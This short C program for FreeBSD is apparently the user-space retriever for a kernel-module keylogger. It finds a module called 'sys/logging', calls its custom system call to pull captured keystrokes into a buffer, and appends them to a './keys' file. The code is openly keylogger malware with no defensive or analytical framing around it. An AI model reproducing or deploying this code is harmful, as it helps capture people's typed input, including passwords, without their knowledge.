#include <sys/types.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>

#include <stdio.h>
#include <unistd.h>

#ifndef OUTPUT_FILE
#define OUTPUT_FILE "./keys"
#endif

int
main(int argc, char **argv)
{
	int call;
	char buf[512];
	struct module_stat stat;
	FILE* fp;

	/* Get the keylogged output to user space */
	stat.version = sizeof(stat);
	modstat(modfind("sys/logging"), &stat);
	call = stat.data.intval;
	syscall(call, buf, 512);

	/* Write it to a file */
	fp = fopen(OUTPUT_FILE, "a");
	fprintf(fp, "%s\n", buf);
	fclose(fp);

	return 0;
}
